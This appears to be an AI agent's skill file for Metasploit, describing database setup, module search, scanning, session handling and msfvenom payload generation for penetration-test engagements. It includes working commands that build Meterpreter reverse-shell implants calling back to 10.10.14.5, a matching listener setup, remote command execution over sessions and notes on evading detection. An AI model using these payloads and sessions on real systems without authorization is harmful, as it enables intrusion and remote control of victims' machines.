---
name: metasploit
description: "Drive msfconsole, msfvenom and the PostgreSQL-backed Metasploit database: search and run modules, import scan data, manage sessions and generate payloads with matching handlers. Use when a task needs an exploit module, a staged or stageless payload, or a searchable store of hosts, services and credentials. Not for pure port scanning (use nmap) or for payload-free AD attacks (use netexec or impacket)."
---

# Metasploit

Metasploit is the framework around three things you actually use here: `msfconsole` to find and run modules, `msfvenom` to build payloads, and a PostgreSQL database that remembers hosts, services and credentials across console restarts. `msfconsole -v` reports `Framework Version: 6.5.9-dev-`.

The database is wired by hand on this host. `db_status` answers `Connected to msf. Connection type: postgresql.` because `~/.msf4/database.yml` points at the local server; `msfdb` itself refuses to run as root.

## When to use

| Goal | Interface | Example |
| --- | --- | --- |
| Find a module for a CVE or service | `search` | `search cve:2017-0144 type:exploit` |
| Run an auxiliary scanner with real options | `use` + `set` + `run` | SMB version sweep |
| Store scan results across sessions | `db_nmap`, `db_import` | nmap XML into `hosts`/`services` |
| Separate engagements | `workspace` | one workspace per client |
| Build an implant | `msfvenom` | exe, elf, psh, war |
| Catch a shell | `exploit/multi/handler` | matching staged/stageless payload |
| Work with shells you already have | `sessions` | interact, script, kill |
| Reuse credentials found anywhere | `creds` | one table, with a JtR format column |

Prefer nmap for scanning, netexec/impacket for AD, and this framework when you specifically need a module or a payload.

## Prerequisites

- `msfconsole`, `msfvenom`, `msfdb` on PATH (`/usr/bin`), framework under `/opt/metasploit-framework`.
- Database: `pg_isready` must print `accepting connections`. `~/.msf4/database.yml` holds the `production` block (adapter `postgresql`, database `msf`, user `msf`, host `127.0.0.1`, port `5432`).
- `msfdb status` as root fails with `Please run msfdb as a non-root user`. That is expected: connect with `db_connect -y ~/.msf4/database.yml` (or just rely on the file) instead of re-initialising.
- First console start builds the module cache and is slow; later starts are faster.
- Keep a workspace per engagement, or the host table becomes unusable.

## Core invocations

```sh
# 1. Version plus a one-shot database health check, no banner
msfconsole -q -x 'db_status; exit'

# 2. Interactive console (the normal mode)
msfconsole -q

# 3. Search by CVE, then by platform and type
#    msf6 > search cve:2017-0144 type:exploit
#    msf6 > search type:auxiliary platform:windows smb

# 4. Import existing nmap XML instead of rescanning
#    msf6 > db_import /tmp/nmap-full.xml

# 5. Scan straight into the database (wraps nmap, needs root for -sS)
#    msf6 > db_nmap -sV -p 22,80,443,445 10.10.10.0/24
#    msf6 > hosts
#    msf6 > services

# 6. One workspace per engagement, then switch back to it later
#    msf6 > workspace -a client-a
#    msf6 > workspace client-a

# 7. Use a module, inspect it, set targets, run
#    msf6 > use auxiliary/scanner/smb/smb_version
#    msf6 > show options
#    msf6 > set RHOSTS 10.10.10.0/24
#    msf6 > set THREADS 8
#    msf6 > run

# 8. Reconnect the DB by hand when the service moved or the yml changed
#    msf6 > db_connect -y ~/.msf4/database.yml

# 9. Windows x64 Meterpreter, staged, as an exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o /tmp/upd.exe

# 10. Stageless Linux ELF - one file, no second connection
msfvenom -p linux/x64/meterpreter_reverse_https LHOST=10.10.14.5 LPORT=443 -f elf -o /tmp/agent.elf

# 11. Inspect payload options and output formats before generating
msfvenom -p windows/x64/meterpreter/reverse_tcp --list-options
msfvenom -l formats

# 12. Handler that matches payload 9, backgrounded, exit-on-session off
#    msf6 > use exploit/multi/handler
#    msf6 > set payload windows/x64/meterpreter/reverse_tcp
#    msf6 > set LHOST 10.10.14.5
#    msf6 > set LPORT 4444
#    msf6 > set ExitOnSession false
#    msf6 > run -j

# 13. Work with sessions: list, interact, run a command on several, kill
#    msf6 > sessions -l
#    msf6 > sessions -i 1
#    msf6 > sessions -c 'whoami' -i 1
#    msf6 > sessions -k 1

# 14. Scripted startup: everything above from a resource file
printf '%s\n' 'workspace -a client-a' 'db_nmap -sV 10.10.10.5' 'exit' > /tmp/setup.rc
msfconsole -q -r /tmp/setup.rc

# 15. PowerShell payload printed to stdout, ready to embed in a stager
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f psh
```

## Flags that matter

| Flag / command | Scope | Effect |
| --- | --- | --- |
| `-q` | msfconsole | no banner, script-friendly |
| `-x 'cmd; cmd'` | msfconsole | run commands then exit |
| `-r file.rc` | msfconsole | resource script at startup |
| `-v` | msfconsole | print framework version and exit |
| `-p` | msfvenom | payload name, `--list-options` shows its parameters |
| `-f` | msfvenom | output format: `exe`, `elf`, `elf-so`, `dll`, `psh`, `hta-psh`, `war`, `msi`, `vba`, `macho` |
| `-o` | msfvenom | write to file instead of stdout |
| `-e` / `-i` | msfvenom | encoder and iteration count; cosmetic on modern targets |
| `-b` | msfvenom | bad characters to avoid, e.g. `'\x00\xff'` |
| `-x` / `-k` | msfvenom | custom template and keep-as-new-thread |
| `--smallest` | msfvenom | try every encoder for the smallest payload |
| `set` / `setg` | console | per-module / global option |
| `run` / `exploit -j` | console | execute, `-j` in the background |
| `check` | console | module-supported non-exploiting probe |
| `db_status` | console | DB connection state |
| `workspace` | console | list, `-a` add, `-d` delete; singular, `workspaces` is not a command |
| `db_nmap` | console | nmap run with results imported |
| `db_import` | console | nmap/masscan/Burp XML, pwdump and others |
| `sessions` | console | `-l` list, `-i` interact, `-c` command, `-k` kill, `-u` upgrade, ranges like `1,3-5` |

## Workflow

1. **Check the database first.** `db_status` must report `postgresql`; otherwise nothing is stored and `db_nmap` silently saves nothing you can query.
2. **Open a workspace** for the engagement before collecting anything.
3. **Collect once**: `db_nmap` for new scans, `db_import` for XML you already have. Query with `hosts` and `services` instead of rescanning.
4. **Search narrowly**: `cve:`, `platform:`, `type:`, `port:`. Read `info` before running anything; check `rank` and disclosure date.
5. **Set options explicitly**, including `RHOSTS`, `RPORT`, `THREADS` and any credentials. Never run a module with defaults against a subnet.
6. **Prefer `check`** when the module supports it. It avoids firing an exploit to learn the target is patched.
7. **Match payload to handler**: staged (`shell/reverse_tcp`) needs the handler waiting; stageless (`shell_reverse_tcp`) is one file. Mismatch is the most common "session never appeared".
8. **Record evidence**: `creds`, `hosts`, `services`, `loot` are the report. Export before closing the workspace.

## OPSEC and telemetry

- `msfvenom` output is heavily signatured. Default templates, encoders and the classic `meterpreter/reverse_tcp` pattern are detected by every EDR; encoding is not obfuscation.
- Staged payloads make two connections: the stager then the stage. Proxies and egress filters see both, and a half-blocked path yields a session that dies at stage two.
- `exploit/multi/handler` keeps listening after a session with `ExitOnSession false`; a forgotten handler is a listening port and a log entry.
- `db_nmap` runs real nmap from your host, so your source IP, timing template and scan type are all visible exactly as with nmap.
- Auxiliary scanners in this framework are slower and noisier than dedicated tools; `THREADS` defaults can trip IDS thresholds.
- The database stores target addresses, credentials in cleartext and module output on your disk. It survives restarts and is readable by anything running as the same user.
- Sessions are recorded with timestamps and module names; that log is the clearest possible evidence of which exploit was used.

## Failure modes

| Symptom | Cause | Fix |
| --- | --- | --- |
| `db_status` reports no database | yml missing or postgres down | `pg_isready`; `db_connect -y ~/.msf4/database.yml` |
| `msfdb status` prints `Please run msfdb as a non-root user` | root shell | expected here; use `db_connect`, do not re-init as root |
| `[-] Unknown command: workspaces` | plural | `workspace` |
| `db_nmap` finishes but `hosts` is empty | no DB connection at scan time | reconnect, rerun, or `db_import` the XML |
| Search returns nothing | wrong keyword value or typo | `search cve:2017-0144`; drop filters one at a time; `-S` for regex |
| Module refuses to run | required option unset | `show options`, `show missing` |
| Handler starts then exits instantly | port already bound or LHOST wrong | `ss -lntp` on LPORT, set LHOST to the reachable interface |
| Payload executes but no session | staged/stageless or payload mismatch | handler `set payload` to the exact payload used in `msfvenom` |
| `msfvenom` warns `No arch selected` | arch inferred from payload | harmless; pin with `-a x64` to be explicit |
| Console takes a minute to start | rebuilding module cache | wait; the cache is reused afterwards |

## Verification

```sh
msfconsole -v                                  # expect: Framework Version: 6.5.9-dev-
msfconsole -q -x 'db_status; exit'             # expect: Connected to msf. Connection type: postgresql.
pg_isready                                     # expect: accepting connections
msfvenom -l formats | head -12                 # expect: asp, aspx, dll, elf, exe, ...
msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o /tmp/t.elf
file /tmp/t.elf                                # expect: ELF 64-bit LSB executable, x86-64, statically linked
```

Measured on this host: that last payload produced a 194-byte ELF from a 74-byte payload body. Keep `db_status`, `hosts`, `services` and `sessions -l` output as evidence of what ran and what it touched.

## Related skills

- [nmap](../nmap/SKILL.md) for the scan itself, before importing
- [netexec](../netexec/SKILL.md) for AD work this framework handles poorly
- [chisel](../chisel/SKILL.md) and [ligolo-ng](../ligolo-ng/SKILL.md) to route a session through a pivot
- [john](../john/SKILL.md) for hashes that land in the `creds` table
- [toolchain-router](../toolchain-router/SKILL.md) to decide whether a module is needed at all